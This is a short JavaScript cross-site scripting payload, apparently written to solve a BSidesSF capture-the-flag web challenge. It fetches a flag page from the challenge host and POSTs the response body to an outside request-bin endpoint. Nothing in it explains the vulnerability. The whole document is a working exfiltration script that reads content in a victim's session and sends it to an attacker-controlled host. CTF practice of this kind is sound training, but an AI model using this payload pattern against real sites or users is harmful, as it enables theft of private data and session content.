fetch('https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag')
  .then(response => response.text()) // Change to .text() if the data is not JSON
  .then(data => {
    // Assuming 'data' is the response from http://localhost/api/data
    const requestData = {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain' // Change content type if the data is not JSON
      },
      body: data
    };

    // Send data to https://rbaskets.in/yhwgzxk
    fetch('https://rbaskets.in/yhwgzxk', requestData)
      .then(response => {
        if (response.ok) {
          console.log('Data sent successfully to https://rbaskets.in/yhwgzxk');
        } else {
          console.error('Failed to send data to https://rbaskets.in/yhwgzxk');
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
  })
  .catch(error => {
    console.error('Error:', error);
  });
